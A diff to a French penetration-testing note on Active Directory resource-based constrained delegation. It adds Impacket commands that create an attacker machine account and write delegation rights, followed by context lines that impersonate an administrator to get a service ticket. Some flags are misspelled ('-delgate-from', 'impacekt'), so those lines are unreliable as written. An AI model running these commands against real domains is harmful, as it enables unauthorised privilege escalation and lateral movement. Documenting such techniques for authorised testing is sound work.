@@ -56,6 +56,11 @@ Windows :&#x20;
 Linux :&#x20;
 
 ```
+#optionnel
+addcomputer.py -method LDAPS -computer-name 'ATTACKERSYSTEM$' -computer-pass 'Summer2018!' -dc-host <DC.DOMAIN.LOCAL> -domain-netbios <DOMAIN.LOCAL> '<DOMAIN.LOCAL/<USER>:<PASS>'
+rbcd.py -delgate-from 'ATTACKERSYSTEM$' -delegate-to 'MACHINE$' -action 'write' '<DOMAIN.LOCAL/<USER>:<PASS>'
+#fin
+
 $ impacekt-getST -spn "cifs/<MACHINE-CIBLE>.<DOMAINE>" -impersonate <ADMIN-MACHINE-CIBLE> -dc-ip <IP-DC> '<DOMAINE>/<FAKE-MACHINE>$:123456'
 $ export KRB5CCNAME=<ADMIN-MACHINE-CIBLE>.ccache
 $ klist
